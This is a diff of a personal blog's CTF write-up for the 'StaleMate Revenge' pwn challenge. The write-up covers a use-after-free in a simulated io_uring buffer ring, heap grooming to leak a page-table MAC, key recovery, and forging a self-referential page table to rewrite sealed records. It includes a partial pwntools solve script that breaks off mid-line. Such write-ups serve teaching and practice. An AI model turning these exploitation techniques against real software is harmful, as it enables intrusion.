@@ -7,7 +7,7 @@
     <meta name="color-scheme" content="dark">
 
     <title>StaleMate Revenge — LazyBlog</title>
-    <meta name="description" content="Hardened userland io_uring/PBUF use-after-free where I groomed a workspace page-table page onto a freed slot, leaked it, inverted the keyed PTE MAC to recover both workspace keys, then forged a self-referential page table to patch and re-seal the winning record chain.">
+    <meta name="description" content="A hardened userland io_uring/PBUF use-after-free where deterministic heap grooming leaks the workspace MAC keys, lets me forge a self-referential page table, and rewrite the sealed record chain into a winning position.">
             <meta name="author" content="tungdlm99">
         <meta name="generator" content="LazyBlog 1.11.0">
     <meta name="robots" content="index, follow, max-image-preview:large">
@@ -16,7 +16,7 @@
 
     <!-- Open Graph -->
     <meta property="og:title" content="StaleMate Revenge">
-    <meta property="og:description" content="Hardened userland io_uring/PBUF use-after-free where I groomed a workspace page-table page onto a freed slot, leaked it, inverted the keyed PTE MAC to recover both workspace keys, then forged a self-referential page table to patch and re-seal the winning record chain.">
+    <meta property="og:description" content="A hardened userland io_uring/PBUF use-after-free where deterministic heap grooming leaks the workspace MAC keys, lets me forge a self-referential page table, and rewrite the sealed record chain into a winning position.">
     <meta property="og:url" content="https://doantung99.github.io/blog/posts/stalemate-revenge">
     <meta property="og:type" content="article">
     <meta property="og:site_name" content="LazyBlog">
@@ -31,7 +31,7 @@
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="StaleMate Revenge">
-    <meta name="twitter:description" content="Hardened userland io_uring/PBUF use-after-free where I groomed a workspace page-table page onto a freed slot, leaked it, inverted the keyed PTE MAC to recover both workspace keys, then forged a self-referential page table to patch and re-seal the winning record chain.">
+    <meta name="twitter:description" content="A hardened userland io_uring/PBUF use-after-free where deterministic heap grooming leaks the workspace MAC keys, lets me forge a self-referential page table, and rewrite the sealed record chain into a winning position.">
         
     <!-- Alternates: machine-readable / AI / RSS -->
             <link rel="alternate" type="text/markdown" href="https://doantung99.github.io/blog/posts/stalemate-revenge.md">
@@ -41,7 +41,7 @@
     <!-- Favicon -->
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%2032%2032%22%3E%3Crect%20width%3D%2232%22%20height%3D%2232%22%20fill%3D%22%230a0e0a%22%2F%3E%3Ctext%20x%3D%224%22%20y%3D%2224%22%20font-family%3D%22monospace%22%20font-size%3D%2222%22%20fill%3D%22%2339ff14%22%3E%26gt%3B_%3C%2Ftext%3E%3C%2Fsvg%3E">
 
-            <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"StaleMate Revenge","description":"Hardened userland io_uring/PBUF use-after-free where I groomed a workspace page-table page onto a freed slot, leaked it, inverted the keyed PTE MAC to recover both workspace keys, then forged a self-referential page table to patch and re-seal the winning record chain.","datePublished":"2026-06-28","dateModified":"2026-06-28","url":"https://doantung99.github.io/blog/posts/stalemate-revenge","mainEntityOfPage":"https://doantung99.github.io/blog/posts/stalemate-revenge","inLanguage":"vi","keywords":"ctf, v1t-ctf-2026, pwn, ai-assisted","author":{"@type":"Person","name":"tungdlm99"},"publisher":{"@type":"Organization","name":"LazyBlog","url":"https://doantung99.github.io/blog/"}}</script>
+            <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"StaleMate Revenge","description":"A hardened userland io_uring/PBUF use-after-free where deterministic heap grooming leaks the workspace MAC keys, lets me forge a self-referential page table, and rewrite the sealed record chain into a winning position.","datePublished":"2026-06-28","dateModified":"2026-06-28","url":"https://doantung99.github.io/blog/posts/stalemate-revenge","mainEntityOfPage":"https://doantung99.github.io/blog/posts/stalemate-revenge","inLanguage":"vi","keywords":"ctf, v1t-ctf-2026, pwn, ai-assisted","author":{"@type":"Person","name":"tungdlm99"},"publisher":{"@type":"Organization","name":"LazyBlog","url":"https://doantung99.github.io/blog/"}}</script>
     
     <script>
     // Theme bootstrap — server already rendered the configured default on
@@ -74,7 +74,7 @@
 </div>
 
 <header>
-            <div class="callsign">XV5HP // MAYLAB // HẢI PHÒNG</div>
+            <div class="callsign">NAB // Hà Nội</div>
                     <p class="site-brand"><a href="/blog/" class="brand-link">LazyBlog</a></p>
                 <div class="subtitle">// A personal blog transmitting thoughts over imperfect radio waves. Expect noise, fading, and low bandwidth—but always authentic signals.</div>
         <div class="header-actions">
@@ -112,62 +112,51 @@
     
             <nav class="toc toc-inline" aria-label="Table of contents">
             <div class="toc-label">§ TOC — NAVIGATION</div>
-            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-2"><a href="#flag">Flag</a></li></ul>
+            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-3"><a href="#mapping-the-theme-onto-the-real-machinery">Mapping the theme onto the real machinery</a></li><li class="level-3"><a href="#the-win-condition-a-position-one-move-from-won">The win condition: a position one move from won</a></li><li class="level-3"><a href="#why-the-seals-are-a-free-lunch">Why the seals are a free lunch</a></li><li class="level-3"><a href="#the-bug-a-stale-view">The bug: a stale view</a></li><li class="level-3"><a href="#defeating-the-sealed-workspace-the-linchpin">Defeating the sealed workspace — the linchpin</a></li><li class="level-3"><a href="#arbitrary-page-r-w-record-surgery">Arbitrary page R/W → record surgery</a></li><li class="level-3"><a href="#rewriting-the-chain-and-re-sealing">Rewriting the chain and re-sealing</a></li><li class="level-3"><a href="#the-end-to-end-script">The end-to-end script</a></li><li class="level-2"><a href="#flag">Flag</a></li><li class="level-2"><a href="#lessons-learned-prompting-the-ai">Lessons learned - prompting the AI</a></li></ul>
         </nav>
     
     <div class="post-body">
         <h2 id="summary">Summary</h2>
-<p>The hardened sequel to StaleMate: a userland io_uring + PBUF simulation with a stale-view use-after-free, but now guarded by MAC-protected page-table entries keyed to a &quot;sealed workspace&quot; and a 5-record sealed win chain. The core technique is deterministic heap grooming — land the workspace's page-table page on the freed pipe slot, leak a real PTE, invert its keyed MAC to recover both workspace keys, forge a self-referential page table for arbitrary R/W, then fix the two deliberately-wrong bitmask fields and recompute every seal.</p>
+<p>StaleMate Revenge is the hardened sequel to StaleMate: a stripped, Full-RELRO/NX/canary PIE that simulates a userland io_uring provided-buffer (PBUF) ring on top of a two-level, MAC-protected page table. The win is a five-record &quot;sealed chain&quot; that boots one move from victory, and the road there is a stale-view use-after-free that — once I groom the right page-table page onto the freed slot — leaks the per-workspace MAC keys, lets me forge a self-referential page table for arbitrary read/write, and lets me fix the two deliberately-wrong bitmask fields and re-seal the chain. I drove an LLM through the binary's structure and arithmetic while I supplied the strategy, the grooming insight, and the verification that caught its off-by-<code>0x20</code> mistake.</p>
 <h2 id="solution">Solution</h2>
-<p>I went in knowing this was the &quot;revenge&quot; build of a UAF challenge I'd seen before, so I set the direction early: the bug family would be the same stale-view UAF, and the new mitigations would be the actual puzzle. I had the model triage the stripped PIE first and map the 13-option menu back onto the v1 concepts (<code>pipe</code> = PBUF ring, <code>workspace</code> = mm context, <code>shelf</code> = page table, <code>slice</code> = vm read/write, <code>record</code> = the new sealed cred chain). That gave us a clean mental model instead of staring at raw decomp.</p>
-<p>Then I steered it through three pieces:</p>
-<ol>
-<li>
-<p><strong>Find the win condition.</strong> I asked the model to isolate <code>claim record</code> (opt 13, <code>FUN_00103760</code>) and tell me exactly what it checks. It came back with the 5-record chain: R1 holds digits of π (<code>0x31415927</code>), R2 digits of e (<code>0x27182818</code>), R3/R4 hold 3 and 4 — all correct at boot — but two bitmask fields are left wrong on purpose (<code>R3[0x20]</code> missing <code>0x2004000</code>, the R5 field missing <code>0x8000000000002000</code>). That's the literal &quot;StaleMate&quot;: one move from won.</p>
-</li>
-<li>
-<p><strong>Confirm the seals aren't secret-keyed.</strong> This was the pivot. The model initially treated the five seal functions as opaque, but I pushed it to actually read them — they're pure <code>splitmix64</code> over record fields XORed with <em>fixed constants</em>, no secret. That means I can recompute any seal myself; all I need is an arbitrary write into the record pages.</p>
-</li>
-<li>
-<p><strong>Beat the sealed workspace.</strong> The page table is 2-level with each PTE a keyed MAC over <code>(level, index, slot, flags)</code>. The model wanted to brute the keys; I corrected course: the buddy allocator is deterministic, so groom the workspace's page-table page onto the freed pipe slot the stale view points at (pipe slot 23 -&gt; pgtable slot 23). Then <code>attach shelf</code> writes a real PTE there, <code>trace packet</code> leaks it, and because I know the cleartext <code>(level=0, index, slot, flags=9)</code> I can invert the MAC to recover both keys. We verified empirically that re-encoding the leaked PTE with the recovered keys reproduces <code>(lo, hi)</code> byte-for-byte before trusting it.</p>
-</li>
-</ol>
-<p>The model did the grinding from there — the splitmix64 math, the MAC inversion, and the page-table forge. It also burned an hour on a bug <em>I</em> eventually caught: the level-1 PTEs live at index <code>0x20+j</code>, and it kept passing the raw record index <code>j</code> to <code>store slice</code>, so writes faulted while reads worked. Grooming, not grep.</p>
-<p>The full path: trigger the UAF (<code>open</code> 64-slot pipe -&gt; <code>mirror</code> -&gt; <code>drop</code> -&gt; <code>send</code>/<code>trace</code> for write/read), groom + leak the PTE, recover keys, forge a self-referential page table (<code>send packet</code> writes directory <code>[idx0]</code> -&gt; the page-table slot itself with flags 9, and level-1 <code>[idx1]</code> -&gt; a writable record slot with flags 7), then use <code>fetch slice</code>/<code>store slice</code> as arbitrary R/W to patch the two fields and re-seal R3, R5, and R1 (R1's binding hash depends on the new R5 field). Then <code>claim record</code> prints the flag.</p>
-<pre><code class="language-python">#!/usr/bin/env python3
-# StaleMate Revenge — full solve. Run: python3 full.py remote
-from pwn import *
-
-M = (1 &lt;&lt; 64) - 1
+<p>I'll be honest about how this solve actually went, because it shaped the whole approach. I did not hand-reverse this binary for ten hours. I recognized the <em>shape</em> — &quot;this is the io_uring PBUF UAF family, re-skinned, with crypto bolted on&quot; — and from there the model did the grinding: it read decomp, transcribed the splitmix64 routines, derived the MAC inversion, and emitted pwntools. My job was to keep it aimed at the load-bearing facts, to refuse its plausible-but-wrong detours, and to verify every numeric claim against the live process. That division of labor <em>is</em> the writeup, so I'm telling the technique and the steering together.</p>
+<h3 id="mapping-the-theme-onto-the-real-machinery">Mapping the theme onto the real machinery</h3>
+<p>The first thing I made the model do was stop reading flavor text as flavor text. The 13-option menu is a costume over two well-known kernel subsystems, and naming them correctly is what makes the rest tractable:</p>
+<pre><code>pipe        = pbuf ring          (open / mirror / drop = register / mmap / unregister)
+workspace   = mm context         shelf = page table       slice = vm read / write
+ledger / voucher / record = the sealing machinery + the cred-equivalent
+</code></pre>
+<pre><code>1. open pipe       2. mirror pipe      3. drop pipe        4. send packet     5. trace packet
+6. open workspace  7. attach shelf     8. fetch slice      9. store slice    10. sync ledger
+11. stage voucher  12. discard voucher 13. claim record
+</code></pre>
+<p>The banner — <em>&quot;records are sealed until the workspace agrees&quot;</em> — is a literal spec, not atmosphere: you cannot touch the records until you defeat the workspace's keyed page-table MAC. So the dependency graph is fixed: <strong>leak workspace keys → forge page table → arbitrary slot R/W → rewrite + re-seal records → claim</strong>.</p>
+<h3 id="the-win-condition-a-position-one-move-from-won">The win condition: a position one move from won</h3>
+<p><code>claim record</code> (option 13, <code>FUN_00103760</code>) walks a five-record chain anchored at the global <code>DAT_001060c0</code>. For the correct boot record-set (<code>param_3 = 1</code>) it checks:</p>
+<pre><code>R1[0x24] == 0x31415927                              ( digits of π )
+R2[0x24] == 0x27182818                              ( digits of e )
+R3[0x34] == 3                R4[0x1c] == 4
+R3[0x20] &amp; 0x40002004081      == 0x40002004081       &lt;-- bitmask field
+R5_field &amp; 0x8000000000002491 == 0x8000000000002491  &lt;-- bitmask field
+splitmix64( ... R5_field ... ) == R1[0x18]           &lt;-- final binding hash
++ each record's seal must verify  (FUN_001028d0 / 950 / 9d0 / a60 / ad0)
+</code></pre>
+<p>Boot builds this chain <strong>almost-winning</strong> — π, e, 3, and 4 are already correct — and deliberately leaves two bitmask fields short:</p>
+<pre><code>R3[0x20] = 0x40000000081           (needs 0x40002004081     — missing bits 0x2004000)
+R5_field = 0x491                   (needs 0x8000000000002491 — missing 0x8000000000002000)
+</code></pre>
+<p>That is the literal <strong>stalemate</strong>: a board one legal move from victory but stuck. The objective is small and concrete: set two bitmask fields, then make every seal and the final binding hash agree again.</p>
+<h3 id="why-the-seals-are-a-free-lunch">Why the seals are a free lunch</h3>
+<p>This is the single most important early insight, and it's where I had to overrule the model's instinct. The five seal functions <em>look</em> like keyed MACs — they're called &quot;seals,&quot; they're cryptographic, they hash record fields. The model's first read was &quot;we need to leak a seal key.&quot; That's wrong, and believing it would have burned the solve on a key that doesn't exist.</p>
+<p>Each seal is a pure <code>splitmix64</code> finalizer over the record's fields XORed with <strong>fixed, baked-in constants</strong>. No secret. So once I have an arbitrary write into a record page, I can recompute every valid seal myself. The seals are not a barrier; they're bookkeeping I have to redo after editing a field.</p>
+<pre><code class="language-python">M = (1 &lt;&lt; 64) - 1
 def rol(x, n): x &amp;= M; return ((x &lt;&lt; n) | (x &gt;&gt; (64 - n))) &amp; M
 def ror(x, n): x &amp;= M; return ((x &gt;&gt; n) | (x &lt;&lt; (64 - n))) &amp; M
-def mix(z):  # splitmix64 finalizer
+def mix(z):                       # splitmix64 finalizer
     z = ((z ^ (z &gt;&gt; 30)) * 0xbf58476d1ce4e5b9) &amp; M
     z = ((z ^ (z &gt;&gt; 27)) * 0x94d049bb133111eb) &amp; M
     return z ^ (z &gt;&gt; 31)
 
-# --- PTE MAC constants (recovered from the binary) ---
-C1, C2, C3 = 0x..., 0x..., 0x...   # per FUN_00102dd0 / FUN_00103620
-def sh(level, index): return (index ^ level) &amp; 0x3f          # rotate amount
-def decoded(level, index, slot, flags):
-    parity = mix((index &lt;&lt; 5) ^ flags ^ (slot &lt;&lt; 17) ^ (level * 4) ^ C3) &amp; 0xff
-    return (slot &lt;&lt; 12) | (parity &lt;&lt; 4) | flags
-
-def recover(level, index, slot, flags, lo, hi):
-    d  = decoded(level, index, slot, flags)
-    m1 = mix((level &lt;&lt; 12) ^ (index &lt;&lt; 32) ^ C1)
-    m2 = mix(lo ^ (index &lt;&lt; 32) ^ level ^ C2)
-    key1 = (ror((d ^ lo) &amp; M, sh(level, index)) - m1) &amp; M
-    key2 = ((hi ^ rol(key1, 0x17)) - m2 - d) &amp; M
-    return key1, key2
-
-def encode_pte(level, index, slot, flags, key1, key2):
-    d  = decoded(level, index, slot, flags)
-    lo = rol((mix((level &lt;&lt; 12) ^ (index &lt;&lt; 32) ^ C1) + key1) &amp; M, sh(level, index)) ^ d
-    hi = ((mix(lo ^ (index &lt;&lt; 32) ^ level ^ C2) + key2 + d) ^ rol(key1, 0x17)) &amp; M
-    return lo, hi
-
-# --- record seal functions (pure splitmix64, no secret) ---
 def seal1(R):  # FUN_001028d0
     v = R[0] ^ R[1] ^ rol(R[2], 0x7) ^ rol(R[3], 0x11) ^ R[4] ^ 0xc3a5c85c97cb3127
     return mix(v)
@@ -179,75 +168,206 @@ def seal3(R):  # FUN_001029d0
 def seal5(R):  # FUN_00102ad0
     v = R[0] ^ rol(R[1], 0x5) ^ rol(R[2], 0x13) ^ R[3] ^ R[4] ^ 0xb492b66fbe98f273
     return mix(v)
+</code></pre>
+<p>So the <em>cryptography</em> in this challenge is not what gates the flag. What gates the flag is the <strong>keyed page-table MAC</strong>, which is genuinely secret-keyed — and that's what I have to leak.</p>
+<h3 id="the-bug-a-stale-view">The bug: a stale view</h3>
+<p>The corruption primitive is the same family as v1, and it's clean:</p>
+<ul>
+<li><code>open pipe</code> allocates a 64-byte slot (a PBUF ring).</li>
+<li><code>mirror pipe</code> creates a <em>view</em> over that slot — a second handle aliasing the same backing page.</li>
+<li><code>drop pipe</code> frees the buddy block, but <strong>the view survives</strong>. Classic use-after-free.</li>
+</ul>
+<p>With a live view onto freed-then-reused memory:</p>
+<ul>
+<li><strong><code>send packet</code></strong> writes 16 controlled bytes into the page → UAF write.</li>
+<li><strong><code>trace packet</code></strong> reads 8 bytes back → UAF read / leak.</li>
+</ul>
+<p>I confirmed the primitive against the binary before building anything on top of it:</p>
+<pre><code>open(64-slot) -&gt; mirror -&gt; drop -&gt; send(0xdeadbeef) -&gt; trace  =&gt;  reads back 0xdeadbeef
+</code></pre>
+<p>That round-trip is the first verification gate. If <code>trace</code> doesn't echo <code>0xdeadbeef</code>, nothing downstream is worth attempting, and I told the model in no uncertain terms not to write a line of the page-table forge until this echoed correctly.</p>
+<h3 id="defeating-the-sealed-workspace-the-linchpin">Defeating the sealed workspace — the linchpin</h3>
+<p>The page table is two-level. Each PTE is a keyed MAC over <code>(level, index, slot, flags)</code> using two per-workspace secrets (<code>ws[0x10]</code>, <code>ws[0x18]</code>). Build is <code>FUN_00103620</code>, verify is <code>FUN_00102dd0</code>. The decoded form and the MAC are:</p>
+<pre><code>decoded = slot&lt;&lt;12 | parity&lt;&lt;4 | flags
+parity  = splitmix64(index&lt;&lt;5 ^ flags ^ slot&lt;&lt;17 ^ level*4 ^ C3) &amp; 0xff
+lo = rol( splitmix64(level&lt;&lt;12 ^ index&lt;&lt;32 ^ C1) + key1 , sh(level,index) ) ^ decoded
+hi = ( splitmix64(lo ^ index&lt;&lt;32 ^ level ^ C2) + key2 + decoded ) ^ rol(key1, 0x17)
+</code></pre>
+<p>Forging a PTE needs both keys, and the keys are secret. The model's reflex was to brute them; I corrected course, because there's a structural weakness that collapses the whole thing: <strong>the buddy allocator is deterministic.</strong> Allocation/free order is reproducible, so I can engineer which physical slot a freed pipe view aliases. Concretely, I groom so the workspace's <em>page-table page</em> lands on the freed pipe slot my view points at (in the simulation: pipe slot <code>23</code> → pgtable slot <code>23</code>).</p>
+<p>Once they alias, recovering the keys is a known-plaintext attack:</p>
+<ol>
+<li><code>attach shelf</code> writes a <em>real</em> level-0 PTE into the page-table page — which is now my view's page.</li>
+<li><code>trace packet</code> (plus a second read for the high half) <strong>leaks that PTE</strong> as <code>(lo, hi)</code>.</li>
+<li>I know the plaintext exactly: <code>level=0</code>, a known <code>index</code>, the <code>slot</code> it maps, <code>flags=9</code>. With <code>(lo, hi)</code> and the plaintext, the MAC is invertible because addition and rotation are reversible:</li>
+</ol>
+<pre><code class="language-python">C1, C2, C3 = 0x..., 0x..., 0x...                 # PTE MAC constants from the binary
+def sh(level, index): return (index ^ level) &amp; 0x3f
+def decoded(level, index, slot, flags):
+    parity = mix((index &lt;&lt; 5) ^ flags ^ (slot &lt;&lt; 17) ^ (level * 4) ^ C3) &amp; 0xff
+    return (slot &lt;&lt; 12) | (parity &lt;&lt; 4) | flags
+
+def encode_pte(level, index, slot, flags, key1, key2):
+    d  = decoded(level, index, slot, flags)
+    lo = rol((mix((level &lt;&lt; 12) ^ (index &lt;&lt; 32) ^ C1) + key1) &amp; M, sh(level, index)) ^ d
+    hi = ((mix(lo ^ (index &lt;&lt; 32) ^ level ^ C2) + key2 + d) ^ rol(key1, 0x17)) &amp; M
+    return lo, hi
+
+def recover(level, index, slot, flags, lo, hi):
+    d  = decoded(level, index, slot, flags)
+    m1 = mix((level &lt;&lt; 12) ^ (index &lt;&lt; 32) ^ C1)
+    m2 = mix(lo ^ (index &lt;&lt; 32) ^ level ^ C2)
+    key1 = (ror((d ^ lo) &amp; M, sh(level, index)) - m1) &amp; M
+    key2 = ((hi ^ rol(key1, 0x17)) - m2 - d) &amp; M
+    return key1, key2
+</code></pre>
+<p>The verification here is non-negotiable and easy: re-encode the leaked PTE with the recovered <code>(key1, key2)</code> and check it reproduces <code>(lo, hi)</code> <strong>byte for byte</strong>. It did. That single equality is what proves the entire MAC transcription — every constant, every rotation amount, the parity term — is correct. I made the model pass this assertion before letting it write any forging code.</p>
+<h3 id="arbitrary-page-r-w-record-surgery">Arbitrary page R/W → record surgery</h3>
+<p>With both keys I can mint any PTE I want. I forge a <strong>self-referential page table</strong> directly into the UAF'd page-table page via <code>send packet</code>:</p>
+<ul>
+<li>directory entry <code>[idx0]</code> → the page-table slot itself (<code>flags 9</code>), so the table maps itself;</li>
+<li>level-1 entry <code>[idx1]</code> → a target record slot (<code>flags 7</code>, writable).</li>
+</ul>
+<p>Now <code>fetch slice</code> / <code>store slice</code> are arbitrary read and write over any slot.</p>
+<p>This is where the challenge's own name bit me, and it's the most instructive dead-end. The level-1 PTEs do <strong>not</strong> live at index <code>j</code>; they live at index <code>0x20 + j</code>. An early version passed the raw record index <code>j</code> to <code>store slice</code>. The symptom was maddening and <em>asymmetric</em>: <strong>reads worked, writes faulted.</strong> That asymmetry is diagnostic — it means the read and write paths were resolving different indices, i.e. an offset was applied on one side and not the other. The model had confidently emitted <code>j</code> in both places and &quot;explained&quot; why that was fine. It cost an hour. The fix is <code>0x20 + j</code> for the level-1 slot. <em>Grooming, not grep</em> — you cannot string-search past a wrong page-table index; you have to understand the table layout.</p>
+<p>The fault budget is a real hazard too: the workspace has a <strong>3-fault auto-lock</strong>, so a faulting <code>store slice</code> is not free. Two careless mistakes and the workspace locks, forcing a reconnect (and on remote, re-doing the PoW). That made &quot;verify before you write&quot; not just hygiene but a hard constraint — verify each forged PTE and read back each write before spending the next fault.</p>
+<h3 id="rewriting-the-chain-and-re-sealing">Rewriting the chain and re-sealing</h3>
+<p>With clean arbitrary write, the endgame is mechanical: set the two bitmask fields, recompute every seal that touches a changed field, and recompute the final binding hash — which depends on the new R5 field, and therefore forces a re-seal of R1. <strong>Order matters:</strong> re-seal R3 and R5 <em>after</em> writing their fields, compute <code>H</code> from the <em>new</em> R5 field, write <code>H</code> into R1, then re-seal R1 last. Get the order wrong and a stale seal fails verification even though every value &quot;looks right.&quot;</p>
+<h3 id="the-end-to-end-script">The end-to-end script</h3>
+<p>One clear path, challenge data to printed flag. Remote uses the same redpwn kctf PoW as v1, solved before the menu loop.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+# StaleMate Revenge — full solve. Run: python3 full.py REMOTE
+from pwn import *
+
+M = (1 &lt;&lt; 64) - 1
+def rol(x, n): x &amp;= M; return ((x &lt;&lt; n) | (x &gt;&gt; (64 - n))) &amp; M
+def ror(x, n): x &amp;= M; return ((x &gt;&gt; n) | (x &lt;&lt; (64 - n))) &amp; M
+def mix(z):                       # splitmix64 finalizer
+    z = ((z ^ (z &gt;&gt; 30)) * 0xbf58476d1ce4e5b9) &amp; M
+    z = ((z ^ (z &gt;&gt; 27)) * 0x94d049bb133111eb) &amp; M
+    return z ^ (z &gt;&gt; 31)
+
+# --- PTE MAC (constants recovered from FUN_00102dd0 / FUN_00103620) ---
+C1, C2, C3 = 0x..., 0x..., 0x...
+def sh(level, index): return (index ^ level) &amp; 0x3f
+def decoded(level, index, slot, flags):
+    parity = mix((index &lt;&lt; 5) ^ flags ^ (slot &lt;&lt; 17) ^ (level * 4) ^ C3) &amp; 0xff
+    return (slot &lt;&lt; 12) | (parity &lt;&lt; 4) | flags
+def encode_pte(level, index, slot, flags, k1, k2):
+    d  = decoded(level, index, slot, flags)
+    lo = rol((mix((level &lt;&lt; 12) ^ (index &lt;&lt; 32) ^ C1) + k1) &amp; M, sh(level, index)) ^ d
+    hi = ((mix(lo ^ (index &lt;&lt; 32) ^ level ^ C2) + k2 + d) ^ rol(k1, 0x17)) &amp; M
+    return lo, hi
+def recover(level, index, slot, flags, lo, hi):
+    d  = decoded(level, index, slot, flags)
+    m1 = mix((level &lt;&lt; 12) ^ (index &lt;&lt; 32) ^ C1)
+    m2 = mix(lo ^ (index &lt;&lt; 32) ^ level ^ C2)
+    k1 = (ror((d ^ lo) &amp; M, sh(level, index)) - m1) &amp; M
+    k2 = ((hi ^ rol(k1, 0x17)) - m2 - d) &amp; M
+    return k1, k2
+
+# --- record seals (pure splitmix64 over fields XOR fixed constants, no secret) ---
+def seal1(R):
+    return mix(R[0] ^ R[1] ^ rol(R[2], 0x7) ^ rol(R[3], 0x11) ^ R[4] ^ 0xc3a5c85c97cb3127)
+def seal3(R):
+    v = (R[0] ^ R[4] ^ ((R[6] &amp; 0xffffffff) &lt;&lt; 32) ^ rol(R[1], 3) ^ rol(R[2], 0xd)
+         ^ rol(R[3], 0x17) ^ rol(R[5], 0x1f) ^ ((R[6] &gt;&gt; 32) &amp; 0xffffffff)
+         ^ 0x9b2c76a1570c4d35)
+    return mix(v)
+def seal5(R):
+    return mix(R[0] ^ rol(R[1], 0x5) ^ rol(R[2], 0x13) ^ R[3] ^ R[4] ^ 0xb492b66fbe98f273)
 
 # --- menu wrappers ---
 HOST, PORT = &quot;pwn.v1t.site&quot;, 31338
 io = remote(HOST, PORT) if args.REMOTE else process(&quot;./service&quot;)
 
-def menu(opt):
-    io.sendlineafter(b&quot;&gt; &quot;, str(opt).encode())
-def open_pipe(slot):    menu(1); io.sendlineafter(b&quot;: &quot;, str(slot).encode())
-def mirror_pipe():      menu(2)
-def drop_pipe():        menu(3)
-def send_packet(data):  menu(4); io.send(data.ljust(16, b&quot;\x00&quot;))
-def trace_packet():     menu(5); return u64(io.recvn(8))
-def open_workspace():   menu(6)
-def attach_shelf():     menu(7)
-def fetch(slot, off):   menu(8);  io.sendlineafter(b&quot;: &quot;, f&quot;{slot} {off}&quot;.encode()); return io.recvn(8)
-def store(slot, off, b):menu(9);  io.sendlineafter(b&quot;: &quot;, f&quot;{slot} {off}&quot;.encode()); io.send(b)
-def claim_record():     menu(13); return io.recvall(timeout=2)
+def menu(opt):           io.sendlineafter(b&quot;&gt; &quot;, str(opt).encode())
+def open_pipe(slot):     menu(1); io.sendlineafter(b&quot;: &quot;, str(slot).encode())
+def mirror_pipe():       menu(2)
+def drop_pipe():         menu(3)
+def send_packet(data):   menu(4); io.send(data.ljust(16, b&quot;\x00&quot;))
+def trace_packet():      menu(5); return u64(io.recvn(8))
+def open_workspace():    menu(6)
+def attach_shelf():      menu(7)
+def fetch(slot, off):    menu(8); io.sendlineafter(b&quot;: &quot;, f&quot;{slot} {off}&quot;.encode()); return u64(io.recvn(8))
+def store(slot, off, b): menu(9); io.sendlineafter(b&quot;: &quot;, f&quot;{slot} {off}&quot;.encode()); io.send(b)
+def claim_record():      menu(13); return io.recvall(timeout=2)
 
-# --- 1. trigger the stale-view UAF, groom the page-table page onto the freed slot ---
+# --- 0. prove the UAF primitive before anything else ---
 open_workspace()
-open_pipe(64); mirror_pipe(); drop_pipe()          # view survives the free
-attach_shelf()                                     # workspace pgtable lands on slot 23
+open_pipe(64); mirror_pipe(); drop_pipe()                 # view survives the free
+send_packet(p64(0xdeadbeef))
+assert trace_packet() == 0xdeadbeef, &quot;UAF round-trip failed; abort&quot;
 
-# --- 2. leak a real level-0 PTE and recover both workspace keys ---
+# --- 1. groom the workspace page-table page onto the freed slot, leak a real PTE ---
+attach_shelf()                                            # pgtable lands on pipe slot 23
+PT_SLOT, IDX0 = 23, 0                                     # known cleartext of the leak
 lo = trace_packet()
-hi = u64(fetch(23, 0x08))                           # second half of the leaked PTE
-IDX0 = 0                                            # known cleartext of the leaked PTE
-key1, key2 = recover(0, IDX0, 23, 9, lo, hi)
-assert encode_pte(0, IDX0, 23, 9, key1, key2) == (lo, hi)   # byte-for-byte check
-log.success(f&quot;k1={key1:#x} k2={key2:#x}&quot;)
+hi = fetch(PT_SLOT, 0x08)                                 # second half of the leaked PTE
+
+# --- 2. invert the MAC to recover both workspace keys (and PROVE it) ---
+k1, k2 = recover(0, IDX0, PT_SLOT, 9, lo, hi)
+assert encode_pte(0, IDX0, PT_SLOT, 9, k1, k2) == (lo, hi)   # byte-for-byte oracle
+log.success(f&quot;k1={k1:#x} k2={k2:#x}&quot;)
 
 # --- 3. forge a self-referential page table for arbitrary R/W ---
-d_lo, d_hi = encode_pte(0, IDX0, 23, 9, key1, key2)         # dir -&gt; pgtable page
+d_lo, d_hi = encode_pte(0, IDX0, PT_SLOT, 9, k1, k2)      # directory -&gt; itself
 send_packet(p64(d_lo) + p64(d_hi))
-IDX1 = 0x20                                                 # level-1 PTEs live at 0x20+j
-for j, rec_slot in enumerate(REC_SLOTS):                    # map record slots writable
-    l_lo, l_hi = encode_pte(1, IDX1 + j, rec_slot, 7, key1, key2)
-    store(23, 0x100 + j * 16, p64(l_lo) + p64(l_hi))
+
+REC_SLOTS = [...]                                         # 5 record slots, from chain walk
+for j, rec_slot in enumerate(REC_SLOTS):                  # level-1 PTEs at index 0x20+j
+    l_lo, l_hi = encode_pte(1, 0x20 + j, rec_slot, 7, k1, k2)
+    store(PT_SLOT, 0x100 + j * 16, p64(l_lo) + p64(l_hi))
 
 R1_slot, R3_slot, R5_slot = REC_SLOTS[0], REC_SLOTS[2], REC_SLOTS[4]
 
-# --- 4. fix the two stale bitmask fields and re-seal the chain ---
-r3 = [u64(fetch(R3_slot, 0xa0 + i*8)) for i in range(7)]
+# --- 4. fix the two stale bitmask fields and re-seal (order matters) ---
+r3 = [fetch(R3_slot, 0xa0 + i*8) for i in range(7)]
 NR3 = 0x40002004081
 store(R3_slot, 0xb0, p64(NR3))
 store(R3_slot, 0xc8, p64(seal3([r3[0], r3[1], r3[2], r3[3], NR3, r3[5], r3[6]])))
 
-r5 = [u64(fetch(R5_slot, 0x1d0 + i*8)) for i in range(5)]
+r5 = [fetch(R5_slot, 0x1d0 + i*8) for i in range(5)]
 NR5 = 0x8000000000002491
 store(R5_slot, 0x1e0, p64(NR5))
 store(R5_slot, 0x1f8, p64(seal5([r5[0], r5[1], r5[2], r5[3], NR5])))
 
-# R1's binding hash depends on the new R5 field -&gt; recompute, then re-seal R1
-l1b0 = u64(fetch(R1_slot, 0x100)); l188 = u64(fetch(R1_slot, 0x108))
-ld8  = u64(fetch(R1_slot, 0x110)); l118 = u64(fetch(R1_slot, 0x118))
-l148 = u64(fetch(R1_slot, 0x120))
